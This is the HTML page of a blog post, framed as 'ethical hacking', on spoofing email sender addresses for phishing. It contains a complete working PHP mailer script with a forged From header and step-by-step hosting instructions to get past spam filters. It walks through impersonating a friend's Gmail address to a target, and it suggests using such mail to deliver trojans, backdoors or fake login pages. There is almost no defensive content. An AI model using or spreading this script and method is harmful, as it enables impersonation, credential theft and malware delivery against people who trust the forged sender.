@@ -1,0 +1,1029 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+  
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8MEPQP7RCV"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-8MEPQP7RCV');
+  </script>
+
+ 
+<script>
+  (function(h,o,t,j,a,r){
+      h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
+      h._hjSettings={hjid:2857053,hjsv:6};
+      a=o.getElementsByTagName('head')[0];
+      r=o.createElement('script');r.async=1;
+      r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
+      a.appendChild(r);
+  })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
+</script>
+
+
+
+  <meta charset="utf-8">
+  
+  <title>How hackers impersonate email-id’s : Email Spoofing and Phishing Attacks | By Gourav Dhar</title>
+  <meta property="og:title" content=How&#32;hackers&#32;impersonate&#32;email-id’s&#32;:&#32;Email&#32;Spoofing&#32;and&#32;Phishing&#32;Attacks&#32;|&#32;By&#32;Gourav&#32;Dhar />
+  <meta name="twitter:title" content=How&#32;hackers&#32;impersonate&#32;email-id’s&#32;:&#32;Email&#32;Spoofing&#32;and&#32;Phishing&#32;Attacks&#32;|&#32;By&#32;Gourav&#32;Dhar>
+  
+
+  
+  <meta property="og:image" content=https://gourav-dhar.com/images/blogs/email-spoofing/1.jpeg />
+  <meta name="twitter:image" content=https://gourav-dhar.com/images/blogs/email-spoofing/1.jpeg/>
+  
+
+  <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  <!-- mobile responsive meta -->
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Email Spoofing is a type of cyber-attack where the attacker sends fake emails which appear to have been sent by a legitimate/known person or entity. It is a common tactic for carrying out phishing">
+  <meta name="twitter:description" content="Email Spoofing is a type of cyber-attack where the attacker sends fake emails which appear to have been sent by a legitimate/known person or entity. It is a common tactic for carrying out phishing">
+  <meta property="og:description" content="Email Spoofing is a type of cyber-attack where the attacker sends fake emails which appear to have been sent by a legitimate/known person or entity. It is a common tactic for carrying out phishing"/>
+
+  <meta name="author" content="Gourav">
+  <meta name="generator" content="Hugo 0.68.3" />
+
+  <!-- plugins -->
+  
+  <link rel="stylesheet" href="https://gourav-dhar.com/plugins/bootstrap/bootstrap.min.css ">
+  
+  <link rel="stylesheet" href="https://gourav-dhar.com/plugins/slick/slick.css ">
+  
+  <link rel="stylesheet" href="https://gourav-dhar.com/plugins/themify-icons/themify-icons.css ">
+  
+
+  <!-- Main Stylesheet -->
+  
+  <link rel="stylesheet" href="https://gourav-dhar.com/scss/style.min.css" media="screen">
+
+  <!--Favicon-->
+  <link rel="shortcut icon" href="https://gourav-dhar.com/images/favicon.png " type="image/x-icon">
+  <link rel="icon" href="https://gourav-dhar.com/images/favicon.png " type="image/x-icon">
+
+  
+  
+
+  
+
+</head><body><div id="preloader">
+
+<!-- preloader start -->
+<div class="preloader">
+  
+  <img src="https://gourav-dhar.com/images/hourglass.gif " alt="preloader">
+  
+</div>
+<!-- preloader end -->
+
+</div><div id="header">
+<!-- navigation -->
+<header class="navigation">
+  <div class="container">
+    
+    <nav class="navbar navbar-expand-lg navbar-white bg-transparent border-bottom pl-0">
+      <a class="navbar-brand mobile-view" href="https://gourav-dhar.com/"><img class="img-fluid"
+          src="https://gourav-dhar.com/images/logo.webp" alt="Gourav Dhar | Blogger, Software Developer | IIT Roorkee &#39;19"></a>
+      <button class="navbar-toggler border-0" type="button" data-toggle="collapse" data-target="#navigation">
+        <i class="ti-menu"></i>
+      </button>
+
+      <div class="collapse navbar-collapse text-center" id="navigation">
+        <div class="desktop-view">
+          <ul class="navbar-nav mr-auto">
+            
+            <li class="nav-item">
+              <a class="nav-link" href="https://twitter.com/go_rrrave" target="_blank"><i class="ti-twitter-alt"></i></a>
+            </li>
+            
+            <li class="nav-item">
+              <a class="nav-link" href="https://www.instagram.com/go_rrrave" target="_blank"><i class="ti-instagram"></i></a>
+            </li>
+            
+            <li class="nav-item">
+              <a class="nav-link" href="https://github.com/gouravdhar" target="_blank"><i class="ti-github"></i></a>
+            </li>
+            
+            <li class="nav-item">
+              <a class="nav-link" href="https://in.linkedin.com/in/gouravdhar" target="_blank"><i class="ti-linkedin"></i></a>
+            </li>
+            
+          </ul>
+        </div>
+
+        <a class="navbar-brand mx-auto desktop-view" href="https://gourav-dhar.com/"><img class="img-logo"
+            src="https://gourav-dhar.com/images/logo.webp" alt="Gourav Dhar | Blogger, Software Developer | IIT Roorkee &#39;19"></a>
+
+        <ul class="navbar-nav">
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="https://gourav-dhar.com/about/">About</a>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="https://gourav-dhar.com/blogs/">Blogs</a>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="https://gourav-dhar.com/profile">profile</a>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="https://gourav-dhar.com/contact/">Contact</a>
+          </li>
+          
+          
+        </ul>
+
+        
+        <!-- search -->
+        <div class="search pl-lg-4">
+          <button id="searchOpen" class="search-btn"><i class="ti-search"></i></button>
+          <div class="search-wrapper">
+            <form action="https://gourav-dhar.com//search" class="h-100">
+              <input class="search-box px-4" id="search-query" name="s" type="search" placeholder="Type & Hit Enter...">
+            </form>
+            <button id="searchClose" class="search-close"><i class="ti-close text-dark"></i></button>
+          </div>
+        </div>
+        
+
+        
+      </div>
+    </nav>
+  </div>
+</header>
+<!-- /navigation -->
+</div>
+
+<section class="section-sm">
+  <div class="container">
+    <div class="row">
+       
+      <div class="col-lg-8 mx-auto">
+        
+        <a href="/categories/ethical-hacking"
+          class="text-primary">Ethical hacking</a>
+        
+        <h1>How hackers impersonate email-id’s : Email Spoofing and Phishing Attacks</h1>
+        <div class="mb-3 post-meta">
+          <span>By Gourav</span>
+          
+          <span class="border-bottom border-primary px-2 mx-1"></span>
+          <span>13 April 2022</span>
+          
+        </div>
+        
+        <img src="https://gourav-dhar.com/images/blogs/email-spoofing/1.webp" class="img-fluid w-100 mb-4 loading" alt="How hackers impersonate email-id’s : Email Spoofing and Phishing Attacks | By Gourav Dhar">
+        
+        <div class="content mb-5">
+          <p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<h2 id="email-spoofing">Email Spoofing</h2>
+<p><strong>Email Spoofing</strong> is a type of cyber-attack where the attacker sends fake emails which appear to have been sent by a legitimate/known person or entity. It is a common tactic for carrying out <code>phishing attacks</code> or <code>spamming</code>. The receiver of the email will see an email they trust and a name they are familiar with — mostly a friend or a colleague or an organisation they work with) and end up believing the email and taking action as mentioned.</p>
+<p>In my previous blogs, I have mentioned how to <strong>create trojan</strong> and <strong>backdoors</strong>. When executed, the users sees normal files, but in the background, the evil code gets executed. Delivering these files can be an application of email spoofing.</p>
+<p><a href="https://gourav-dhar.com/blogs/how-i-created-an-undetectable-backdoor-for-windows-ethical-hacking/" title="How I created an undetectable backdoor for Windows"><img src="../../images/blogs/email-spoofing/2.webp" alt="Image"></a></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p><a href="https://gourav-dhar.com/blogs/how-i-created-my-trojan-malware-ethical-hacking/" title="How I created a Trojan Malware"><img src="../../images/blogs/email-spoofing/3.webp" alt="Image"></a></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<h2 id="how-to-spoof-emails">How to Spoof Emails</h2>
+<p>The initial step relies on information gathered and deciding which email you want to spoof. <strong>The emails should impersonate emails from a person or an organisation that the target can trust</strong>. It’s all social engineering!</p>
+<p><img src="../../images/blogs/email-spoofing/4.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p>If you are impersonating a friend, you can tell the target person to open an image. If you impersonate a support member from an organisation or admin of a website, you can tell the target to log in using a fake login page or tell the target to install an update.</p>
+<h3 id="take-a-scenario">Take a scenario</h3>
+<p>Suppose I want to impersonate the target person’s friend whose name is <code>Aakash</code> and I know that his email id is <code>aakash@gmail.com</code>. I will try to send a fake email to my target impersonating his email id.</p>
+<p>It is really easy. Go to google and search for <code>spoof emails online</code>.</p>
+<p><img src="../../images/blogs/email-spoofing/5.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p>You will find a lot of websites providing this service. <strong>The problem with sending emails from these websites is that a lot of these emails will end up in the spam directory of the target person and not in the inbox of the person.</strong> The reason for this is because these websites are public and a lot of people use these websites for spamming, so mail server like google, yahoo, etc. mark emails received from these servers as spam.</p>
+<p>To bypass this you can either use your own web-hosting plan or you can sign up for a free web-hosting plan and use that for sending fake emails.</p>
+<h2 id="using-a-web-hosting-plan">Using a web hosting plan</h2>
+<p>The requirement for this method is that the web-hosting provider should support php files, so a static web-hosting won’t work. You can also use your own domain with the web-hosting provider but for this blog I will use a free web-hosting provider. I will be using <a href="https://www.000webhost.com/">https://www.000webhost.com/</a>.</p>
+<p>This is a paid service but I will be using their free plan for this blog. Go to the above link, scroll down and click on Free Sign Up under the <code>Free Web Hosting</code>.</p>
+<p><img src="../../images/blogs/email-spoofing/6.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p>After signing up, click on Create new site button on the top right.</p>
+<p><img src="../../images/blogs/email-spoofing/7.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p>A pop-up will appear where you would need to add your website name and password. Now remember both of these.</p>
+<p>Next open <strong><a href="https://files.000webhost.com/">https://files.000webhost.com/</a></strong> in the same browser where you are logged into the webhost account. You may or may not need to enter the above credentials. If you are prompted, enter the above credentials and proceed. A page similar to the one shown below should be visible.</p>
+<p><img src="../../images/blogs/email-spoofing/8.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p>Open the folder named public_html by double clicking. Save the following script in a file named send.php and upload it to the folder named <code>public_html</code>.</p>
+<pre><code>&lt;?php
+if (isset($_POST[&quot;send&quot;])) {
+$to = $_POST[&quot;to&quot;];
+ $subject = $_POST[&quot;subject&quot;];
+ $message = $_POST[&quot;message&quot;];
+ $from = $_POST[&quot;from&quot;];
+ $name = $_POST[&quot;name&quot;];
+if (!(filter_var($to, FILTER_VALIDATE_EMAIL) &amp;&amp; filter_var($from, FILTER_VALIDATE_EMAIL))) {
+  echo &quot;Email address inputs invalid&quot;;
+   die();
+ }
+$header = &quot;From: &quot; .  $name . &quot; &lt;&quot; . $from . &quot;&gt;\r\nMIME-Version: 1.0\r\nContent-type: text/html\r\n&quot;;
+$retval = mail ($to, $subject, $message, $header);
+if ($retval) {
+  echo &quot;Email sent.&quot;;
+ } else {
+  echo &quot;Email did not send. Error: &quot; . $retval;
+ }
+} else {
+ echo 
+ '&lt;html&gt;
+  &lt;head&gt;
+   &lt;style&gt; 
+    input[type=submit] {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 14px 32px;
+      text-decoration: none;
+      margin: 4px 2px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+   &lt;/style&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+&lt;h2&gt;Spoof Email&lt;/h2&gt;
+&lt;form action=&quot;/send.php&quot; method=&quot;post&quot; id=&quot;emailform&quot;&gt;
+     &lt;label for=&quot;to&quot;&gt;To:&lt;/label&gt;&lt;br&gt;
+     &lt;input type=&quot;text&quot; id=&quot;to&quot; name=&quot;to&quot;&gt;&lt;br&gt;&lt;br&gt;
+     &lt;label for=&quot;from&quot;&gt;From:&lt;/label&gt;&lt;br&gt;
+     &lt;input type=&quot;text&quot; id=&quot;from&quot; name=&quot;from&quot;&gt;&lt;br&gt;&lt;br&gt;
+     &lt;label for=&quot;name&quot;&gt;Name (optional):&lt;/label&gt;&lt;br&gt;
+     &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;name&quot;&gt;&lt;br&gt;&lt;br&gt;
+     &lt;label for=&quot;subject&quot;&gt;Subject:&lt;/label&gt;&lt;br&gt;
+     &lt;input type=&quot;text&quot; id=&quot;subject&quot; name=&quot;subject&quot;&gt;&lt;br&gt;&lt;br&gt;
+     &lt;label for=&quot;message&quot;&gt;Message [HTML is supported]:&lt;/label&gt;&lt;br&gt;
+     &lt;textarea rows=&quot;6&quot; cols=&quot;50&quot; name=&quot;message&quot; form=&quot;emailform&quot;&gt;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;
+     &lt;input type=&quot;hidden&quot; id=&quot;send&quot; name=&quot;send&quot; value=&quot;true&quot;&gt;
+     &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
+   &lt;/form&gt;
+&lt;p&gt;An e-mail will be sent to the desired target with a spoofed From header when you click Submit.&lt;/p&gt;
+&lt;/body&gt;
+ &lt;/html&gt;' ;
+}
+?&gt;
+</code></pre><p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p><img src="../../images/blogs/email-spoofing/9.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p><strong>Great we are done !!!</strong> Now it’s time for some action. Goto the homepage of <code>000webhost</code>. Your site will appear in a card. Click on the url.</p>
+<p><img src="../../images/blogs/email-spoofing/10.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p>For me the url is <code>https://test-xyz-infinee.000webhostapp.com/</code>.</p>
+<p>I need to append <code>send.php</code> to the end of the url and run it.
+So for me the url will be <code>https://test-xyz-infinee.000webhostapp.com/send.php</code></p>
+<p>A form similar to the one shown below will appear.</p>
+<p><img src="../../images/blogs/email-spoofing/11.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p>Since I was impersonating Aakashwhose email id is <code>aakash@gmail.com</code> , I will fill in the details accordingly.</p>
+<p><img src="../../images/blogs/email-spoofing/12.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p>And finally click on submit and poof! Email Sent</p>
+<p><img src="../../images/blogs/email-spoofing/13.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p>On checking my email (target_email), I actually received an email from the email address <code>aakash@gmail.com</code> . I also got a notification on my iPhone and it looks pretty convincing and authentic!</p>
+<p><img src="../../images/blogs/email-spoofing/14.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p><img src="../../images/blogs/email-spoofing/15.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p>Attaching screenshots of how the emails look on the browser when opened.</p>
+<p><img src="../../images/blogs/email-spoofing/16.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p><img src="../../images/blogs/email-spoofing/17.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p><img src="../../images/blogs/email-spoofing/18.webp" alt="Image"></p>
+<p><img src="../../images/blogs/nline.webp" alt="newline"></p>
+<p>The name appears correctly. Even the email id appears correctly.</p>
+<p>The only way to distinguish that it is not original and is a phishing email is the text written after <code>via</code>, that too only if the email is viewed in a web browser.</p>
+
+        </div>
+
+        
+        
+      </div>
+
+      
+      <div class="col-lg-4" id="sidebar">
+    <div class="widgets">
+      
+      <div class="widget">
+        
+        <h4 class="widget-title">About the author</h4>
+        
+        <a href="https://gourav-dhar.com/about/"><img src="https://gourav-dhar.com/images/author.webp" alt=""
+          class="img-fluid author-thumb-sm d-block mx-auto rounded-circle mb-4" loading="lazy"></a>
+        
+        
+        <p>I am Gourav Dhar, a 2019 graduate from IIT Roorkee where I pursued my bachelors in Electronics and Communication Engineering.</p>
+        <a href="https://gourav-dhar.com/about/" class="btn btn-outline-primary">Know More</a>
+        
+      </div>
+          
+      <div class="widget">
+          <h4 class="widget-title">Similar Blogs</h4>
+          <div class="container" id="test">
+            <div class="col">
+                
+              <div class="row-lg-4 similar-post-border">
+                <article class="media">
+                  
+                    
+                      <a href= "https://gourav-dhar.com/blogs/finding-vulnerable-info-using-google-dorks-/" class="h5 d-block mb-3"><div class="recent-post-thumb mr-3" style="background-image: url('https://gourav-dhar.com/images/blogs/google-dorks/1.webp');"></div></a>
+                    
+                  
+                  
+                  <div class="media-body">
+                    <div class="mb-3 post-meta">
+                      
+                      <span>31 Mar 2022</span>
+                      
+                    </div>
+                    
+                      <a href= "https://gourav-dhar.com/blogs/finding-vulnerable-info-using-google-dorks-/" class="h5 d-block mb-3">Finding Vulnerable Info Using Google Dorks</a>
+                      <a href= "https://gourav-dhar.com/blogs/finding-vulnerable-info-using-google-dorks-/" class="btn btn-outline-primary">read more</a>
+                    
+                    
+                  </div>
+                </article>
+              </div>
+              
+              <div class="row-lg-4 similar-post-border">
+                <article class="media">
+                  
+                    
+                      <a href= "https://gourav-dhar.com/blogs/how-i-created-an-undetectable-backdoor-for-windows-ethical-hacking/" class="h5 d-block mb-3"><div class="recent-post-thumb mr-3" style="background-image: url('https://gourav-dhar.com/images/blogs/backdoor/1.png');"></div></a>
+                    
+                  
+                  
+                  <div class="media-body">
+                    <div class="mb-3 post-meta">
+                      
+                      <span>19 Mar 2022</span>
+                      
+                    </div>
+                    
+                      <a href= "https://gourav-dhar.com/blogs/how-i-created-an-undetectable-backdoor-for-windows-ethical-hacking/" class="h5 d-block mb-3">How I created an undetectable Backdoor for Windows</a>
+                      <a href= "https://gourav-dhar.com/blogs/how-i-created-an-undetectable-backdoor-for-windows-ethical-hacking/" class="btn btn-outline-primary">read more</a>
+                    
+                    
+                  </div>
+                </article>
+              </div>
+              
+              <div class="row-lg-4 similar-post-border">
+                <article class="media">
+                  
+                    
+                      <a href= "https://gourav-dhar.com/blogs/how-i-created-my-first-web-crawler-cool-tech-stuff/" class="h5 d-block mb-3"><div class="recent-post-thumb mr-3" style="background-image: url('https://gourav-dhar.com/images/blogs/first-web-crawler/webcrawler.webp');"></div></a>
+                    
+                  
+                  
+                  <div class="media-body">
+                    <div class="mb-3 post-meta">
+                      
+                      <span>12 Mar 2022</span>
+                      
+                    </div>
+                    
+                      <a href= "https://gourav-dhar.com/blogs/how-i-created-my-first-web-crawler-cool-tech-stuff/" class="h5 d-block mb-3">How I created my first Web Crawler!</a>
+                      <a href= "https://gourav-dhar.com/blogs/how-i-created-my-first-web-crawler-cool-tech-stuff/" class="btn btn-outline-primary">read more</a>
+                    
+                    
+                  </div>
+                </article>
+              </div>
+              
+              <div class="row-lg-4 similar-post-border">
+                <article class="media">
+                  
+                    
+                      <a href= "https://gourav-dhar.com/blogs/how-i-created-my-trojan-malware-ethical-hacking/" class="h5 d-block mb-3"><div class="recent-post-thumb mr-3" style="background-image: url('https://gourav-dhar.com/images/blogs/trojan/0_cover.webp');"></div></a>
+                    
+                  
+                  
+                  <div class="media-body">
+                    <div class="mb-3 post-meta">
+                      
+                      <span>06 Mar 2022</span>
+                      
+                    </div>
+                    
+                      <a href= "https://gourav-dhar.com/blogs/how-i-created-my-trojan-malware-ethical-hacking/" class="h5 d-block mb-3">How I created a Trojan Malware</a>
+                      <a href= "https://gourav-dhar.com/blogs/how-i-created-my-trojan-malware-ethical-hacking/" class="btn btn-outline-primary">read more</a>
+                    
+                    
+                  </div>
+                </article>
+              </div>
+              
+              <div class="row-lg-4 similar-post-border">
+                <article class="media">
+                  
+                    
+                      <a href= "https://gourav-dhar.com/blogs/hack-wifi-passwords-crack-wpa2-wifi-passwords-using-brute-force-attacks/" class="h5 d-block mb-3"><div class="recent-post-thumb mr-3" style="background-image: url('https://gourav-dhar.com/images/blogs/wifi/wifi.webp');"></div></a>
+                    
+                  
+                  
+                  <div class="media-body">
+                    <div class="mb-3 post-meta">
+                      
+                      <span>12 Feb 2022</span>
+                      
+                    </div>
+                    
+                      <a href= "https://gourav-dhar.com/blogs/hack-wifi-passwords-crack-wpa2-wifi-passwords-using-brute-force-attacks/" class="h5 d-block mb-3">Hack WiFi Passwords</a>
+                      <a href= "https://gourav-dhar.com/blogs/hack-wifi-passwords-crack-wpa2-wifi-passwords-using-brute-force-attacks/" class="btn btn-outline-primary">read more</a>
+                    
+                    
+                  </div>
+                </article>
+              </div>
+              
+              
+              <div class="row-lg-4 similar-post-border">
+                <article class="media">
+                  
+                    
+                      <a href= "https://gourav-dhar.com/blogs/how-to-perform-a-basic-sql-injection-attack-ethical-hacking/" class="h5 d-block mb-3"><div class="recent-post-thumb mr-3" style="background-image: url('https://gourav-dhar.com/images/blogs/SQLi/1.webp');"></div></a>
+                    
+                  
+                  
+                  <div class="media-body">
+                    <div class="mb-3 post-meta">
+                      
+                      <span>23 Apr 2022</span>
+                      
+                    </div>
+                    
+                      <a href= "https://gourav-dhar.com/blogs/how-to-perform-a-basic-sql-injection-attack-ethical-hacking/" class="h5 d-block mb-3">How to perform a basic SQL Injection Attack?</a>
+                      <a href= "https://gourav-dhar.com/blogs/how-to-perform-a-basic-sql-injection-attack-ethical-hacking/" class="btn btn-outline-primary">read more</a>
+                    
+                    
+                  </div>
+                </article>
+              </div>
+              
+              <div class="row-lg-4 similar-post-border">
+                <article class="media">
+                  
+                    
+                      <a href= "https://gourav-dhar.com/blogs/how-hackers-impersonate-email-ids-email-spoofing-and-phishing-attacks/" class="h5 d-block mb-3"><div class="recent-post-thumb mr-3" style="background-image: url('https://gourav-dhar.com/images/blogs/email-spoofing/1.webp');"></div></a>
+                    
+                  
+                  
+                  <div class="media-body">
+                    <div class="mb-3 post-meta">
+                      
+                      <span>13 Apr 2022</span>
+                      
+                    </div>
+                    
+                      <a href= "https://gourav-dhar.com/blogs/how-hackers-impersonate-email-ids-email-spoofing-and-phishing-attacks/" class="h5 d-block mb-3">How hackers impersonate email-id’s</a>
+                      <a href= "https://gourav-dhar.com/blogs/how-hackers-impersonate-email-ids-email-spoofing-and-phishing-attacks/" class="btn btn-outline-primary">read more</a>
+                    
+                    
+                  </div>
+                </article>
+              </div>
+              
+              <div class="row-lg-4 similar-post-border">
+                <article class="media">
+                  
+                    
+                      <a href= "https://gourav-dhar.com/blogs/i-created-an-automated-whatsapp-reply-bot/" class="h5 d-block mb-3"><div class="recent-post-thumb mr-3" style="background-image: url('https://gourav-dhar.com/images/blogs/wp-bot/1.webp');"></div></a>
+                    
+                  
+                  
+                  <div class="media-body">
+                    <div class="mb-3 post-meta">
+                      
+                      <span>27 Mar 2022</span>
+                      
+                    </div>
+                    
+                      <a href= "https://gourav-dhar.com/blogs/i-created-an-automated-whatsapp-reply-bot/" class="h5 d-block mb-3">I created an automated WhatsApp reply bot!</a>
+                      <a href= "https://gourav-dhar.com/blogs/i-created-an-automated-whatsapp-reply-bot/" class="btn btn-outline-primary">read more</a>
+                    
+                    
+                  </div>
+                </article>
+              </div>
+              
+              <div class="row-lg-4 similar-post-border">
+                <article class="media">
+                  
+                    
+                      <a href= "https://gourav-dhar.com/blogs/spoofing-file-extensions-ethical-hacking/" class="h5 d-block mb-3"><div class="recent-post-thumb mr-3" style="background-image: url('https://gourav-dhar.com/images/blogs/exe-spoof/cover-1.webp');"></div></a>
+                    
+                  
+                  
+                  <div class="media-body">
+                    <div class="mb-3 post-meta">
+                      
+                      <span>05 Mar 2022</span>
+                      
+                    </div>
+                    
+                      <a href= "https://gourav-dhar.com/blogs/spoofing-file-extensions-ethical-hacking/" class="h5 d-block mb-3">Spoofing file extensions</a>
+                      <a href= "https://gourav-dhar.com/blogs/spoofing-file-extensions-ethical-hacking/" class="btn btn-outline-primary">read more</a>
+                    
+                    
+                  </div>
+                </article>
+              </div>
+              
+              <div class="row-lg-4 similar-post-border">
+                <article class="media">
+                  
+                    
+                      <a href= "https://gourav-dhar.com/blogs/information-gathering-first-step-towards-website-hacking/" class="h5 d-block mb-3"><div class="recent-post-thumb mr-3" style="background-image: url('https://gourav-dhar.com/images/blogs/infogathering/infogathering1.webp');"></div></a>
+                    
+                  
+                  
+                  <div class="media-body">
+                    <div class="mb-3 post-meta">
+                      
+                      <span>02 Mar 2022</span>
+                      
+                    </div>
+                    
+                      <a href= "https://gourav-dhar.com/blogs/information-gathering-first-step-towards-website-hacking/" class="h5 d-block mb-3">Information Gathering - Hacking</a>
+                      <a href= "https://gourav-dhar.com/blogs/information-gathering-first-step-towards-website-hacking/" class="btn btn-outline-primary">read more</a>
+                    
+                    
+                  </div>
+                </article>
+              </div>
+              
+              <div class="row-lg-4 similar-post-border">
+                <article class="media">
+                  
+                    
+                      <a href= "https://gourav-dhar.com/blogs/how-to-securely-browse-the-internet-prevent-data-leaks-while-connecting-to-public-wifi-networks/" class="h5 d-block mb-3"><div class="recent-post-thumb mr-3" style="background-image: url('https://gourav-dhar.com/images/blogs/securely.webp');"></div></a>
+                    
+                  
+                  
+                  <div class="media-body">
+                    <div class="mb-3 post-meta">
+                      
+                      <span>26 Feb 2022</span>
+                      
+                    </div>
+                    
+                      <a href= "https://gourav-dhar.com/blogs/how-to-securely-browse-the-internet-prevent-data-leaks-while-connecting-to-public-wifi-networks/" class="h5 d-block mb-3">How to securely browse the Internet while conencting to public networks</a>
+                      <a href= "https://gourav-dhar.com/blogs/how-to-securely-browse-the-internet-prevent-data-leaks-while-connecting-to-public-wifi-networks/" class="btn btn-outline-primary">read more</a>
+                    
+                    
+                  </div>
+                </article>
+              </div>
+              
+            </div>
+          </div>
+       </div>
+  
+       
+    
+
+     
+     <div class="widget">
+        <h4 class="widget-title">Filter By Category</h4>
+        <ul class="list-unstyled">
+         
+
+            <li class="mb-3"><a class="p-2 bg-primary text-white"
+                href="/categories/cool-tech-stuff/">Cool-Tech-Stuff</a>
+              <br></li>
+         
+
+            <li class="mb-3"><a class="p-2 bg-primary text-white"
+                href="/categories/ethical-hacking/">Ethical-Hacking</a>
+              <br></li>
+         
+
+            <li class="mb-3"><a class="p-2 bg-primary text-white"
+                href="/categories/system-design/">System-Design</a>
+              <br></li>
+        </ul>
+      </div>
+  
+
+       
+<div class="widget">
+    <h4 class="widget-title">Filter By Tags</h4>
+    <ul class="list-inline">
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/api/">Api</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/backend/">Backend</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/c&#43;&#43;/">C&#43;&#43;</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/cool-tech-stuff/">Cool tech stuff</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/google-dorks/">Google dorks</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/hacking/">Hacking</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/network-security/">Network security</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/portfolio/">Portfolio</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/programming/">Programming</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/python/">Python</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/spoofing/">Spoofing</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/system-design/">System design</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/threads/">Threads</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/web-crawling/">Web crawling</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/web-scraping/">Web scraping</a></li>
+      <li class="list-inline-item"><a class="d-block p-2 bg-primary text-white"
+          href="/tags/whatsapp-reply-bot/">Whatsapp reply bot</a></li>
+    </ul>
+  </div>
+   
+       
+<div class="widget">
+    <h4 class="widget-title">Social</h4>
+    <ul class="list-inline social-links">
+      
+      <li class="list-inline-item"><a href="https://twitter.com/go_rrrave" target="_blank"><i class="ti-twitter-alt"></i></a></li>
+      
+      <li class="list-inline-item"><a href="https://www.instagram.com/go_rrrave" target="_blank"><i class="ti-instagram"></i></a></li>
+      
+      <li class="list-inline-item"><a href="https://github.com/gouravdhar" target="_blank"><i class="ti-github"></i></a></li>
+      
+      <li class="list-inline-item"><a href="https://in.linkedin.com/in/gouravdhar" target="_blank"><i class="ti-linkedin"></i></a></li>
+      
+    </ul>
+  </div>
+      
+    </div>
+  </div>
+  
+      
+
+      <div class = "desktop-view">
+      
+<section>
+    <div class="container" id="test">
+
+      
+      <div class="widget">
+    <script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="gouravdhar" data-color="#40DCA5" data-emoji=""  data-font="Arial" data-text="Buy me a coffee" data-outline-color="#000000" data-font-color="#ffffff" data-coffee-color="#FFDD00" ></script>    
+</div>
+
+
+        <h2>Similar Blogs</h2>
+        <br>
+      <div class="row">
+        
+        <div class="col-lg-4 small-post-border">
+          <article class="media">
+            
+            
+                  <a href= "https://gourav-dhar.com/blogs/how-to-perform-a-basic-sql-injection-attack-ethical-hacking/"><div class="recent-post-thumb mr-3" style="background-image: url('https://gourav-dhar.com/images/blogs/SQLi/1.webp');"></div></a>
+                  
+                
+            
+            
+            <div class="media-body">
+              <div class="mb-3 post-meta">
+                
+                <span>23 Apr 2022</span>
+                
+              </div>
+              
